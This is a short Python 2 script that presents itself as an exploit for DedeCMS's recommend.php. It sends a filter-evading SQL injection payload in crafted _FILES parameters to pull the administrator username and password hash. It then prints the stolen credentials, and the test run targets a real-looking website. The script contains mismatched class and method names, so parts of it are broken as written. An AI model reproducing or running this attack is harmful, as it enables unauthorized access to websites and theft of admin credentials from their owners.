#coding=utf-8
'''
Author : chongrui
Exploit of recommend.php
Then you can use this class to attack a Dede web application
'''
import requests
import urllib
import re
from bs4 import BeautifulSoup
class DedeAttacker():
	def dede_recommend_exploit(self,url):
		para = '''/plus/recommend.php?_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294&action=&aid=1&_FILES[type][tmp_name]=\\'%20or%20@`'`%20/*!5454union*//*!5454select*/1,2,3,(select%20concat(userid,0x7c,pwd)+from+%23@__admin+limit+1),5,6,7,8,9%23@`'`'''
		data = urllib.quote(para,"?@`[]*,+()/'&=!_%")
		url = "%s%s" % (url,data)
		r = urllib.urlopen(url)
		if r.code == 404:
			return None
		else:
			page_content = r.read()
			pattern = re.compile(r'<h2>推荐：(.*)</h2>')
			res = pattern.findall(page_content)
			return res


if __name__ == '__main__':
	attacker = Dede_recommend_exploit()
	url = 'http://8888ln.com'
	result = attacker.exploit(url)
	if not result:
		print 'Exploit Failed...'
	else:
		print 'Exploit success!'
		result = result[0].split('|')
		print 'Username:%s\nPassword:%s' % (result[0],result[1])









